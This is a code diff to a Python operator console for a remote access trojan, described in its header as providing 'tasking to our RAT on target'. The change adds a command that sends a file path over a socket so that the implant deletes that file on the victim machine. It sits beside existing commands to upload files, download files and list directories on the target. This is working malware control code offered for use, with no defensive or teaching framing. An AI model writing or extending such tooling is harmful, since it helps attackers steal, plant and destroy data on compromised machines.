@@ -2,12 +2,12 @@
 # Version 1.0
 # Serves as the main CMD client interface which will provide tasking to our RAT on target
 
-import sys
 import socket
 import argparse
 from RAT_Py_GetFile import *
 from RAT_Py_PutFile import *
 from RAT_Py_DirList import * 
+from RAT_Py_DeleteFile import *
 #from scapy.all import * # switch from socket to scapy for custom TCP packets
 
 SUCCESS = 1
@@ -23,6 +23,7 @@ def printHelp():
                 1) Write a file to a location on target \n
                 2) Get a file from a specific location on target\n
                 3) Perform a dir list for a particular directory on target\n
+                4) Perform a delete file off target\n
                 0) Exit\n""")
     return SUCCESS
 
@@ -52,6 +53,14 @@ def printPutFileHelp():
 def printDirListHelp():
     print("""Required params: \n
                 -path - path to directory we're listing off target \n""")
+    return SUCCESS
+
+#-----------------------------------------------
+
+#-----------------------------------------------
+def printDeleteFileHelp():
+    print("""Required params: \n
+                -filepath - path to the file we're deleting off target \n""")
     return SUCCESS
 
 #-----------------------------------------------
@@ -132,6 +141,17 @@ def handleInput(ip, port):
             dirPath = bytes(args.path, 'utf-8')
 
             dirList(sock, dirPath)
+
+        elif(int(userInput) == DEL):
+            printDeleteFileHelp()
+            user_input = input("> ")
+            parser = argparse.ArgumentParser(description='Perform a delete file off target')
+            parser.add_argument('-filepath', '--filepath', type=str, help='Path to the file we''re deleting off target', action='store', required=True)
+            args = parser.parse_args(user_input.split())
+            
+            filePath = bytes(args.filepath, 'utf-8')
+
+            deleteFile(sock, filePath)
 
     return
 
